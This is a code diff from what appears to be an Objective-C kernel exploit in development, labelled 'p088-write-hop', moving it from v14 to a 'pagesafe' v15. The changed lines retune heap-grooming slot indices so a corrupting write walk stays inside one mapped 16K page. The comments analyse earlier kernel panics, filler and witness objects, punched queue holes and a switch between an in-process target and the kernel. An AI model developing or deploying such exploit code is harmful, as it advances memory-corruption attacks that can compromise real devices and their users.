@@ -181,7 +181,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P088_BUILD @"p088-write-hop-v14-bandpre"
+#define P088_BUILD @"p088-write-hop-v15-pagesafe"
 
 /* kernel-target tap: 0 = in-process T (safe-ish), 1 = kernel sid (PANIC) */
 #define P088_KERNEL_TARGET 0
@@ -1008,10 +1008,17 @@ static NSString *p088_yfmt(double y) {
              A's dispatch (below) so B's fire0 pops [K_filler(queue),
              K_witness(record)] and B OWNS the spill target during the
              fill. Bad case (our table at w' != witness) disables conv. */
-        uint32_t h = P088_RUN_A0 + 2 * r;                 /* pair base   */
-        if (h + 1 >= nRun) h = P088_RUN_A0;
-        uint32_t sac = P088_RUN_A0 + 2 * P088_ROUNDS + r; /* conv queue  */
-        if (sac >= nRun) sac = P088_RUN_A0;
+        /* v15 page-safety (01:31/01:39/01:42 panic trio decoded): elements
+           are 0xC00-strided, 5 per 16K page; the writer's +0xC00 record walk
+           from a page's LAST element faults on the unallocated next page
+           (FAR = page start, x20=x26=0xc0 all three boots). RUN_A0=14 was
+           h%5==4 (a page-last slot). Step 5 keeps ONE in-page slot class
+           forever: h = 5r+2 (slot 2 of 5) -> the walk always has a mapped
+           next element inside the same page, on every round. */
+        uint32_t h = 2 + 5 * r;                           /* pair base   */
+        if (h + 1 >= nRun) h = 2;
+        uint32_t sac = 2 + 5 * P088_ROUNDS + r;           /* conv queue  */
+        if (sac >= nRun) sac = 2;
         int punched[2] = { -1, -1 };   /* [0]=queue hole, [1]=witness (volley) */
         if (conv) {
             p088_mag_prefill(5);   /* v13: 5 + sac(1) = 6... keep depth headroom:
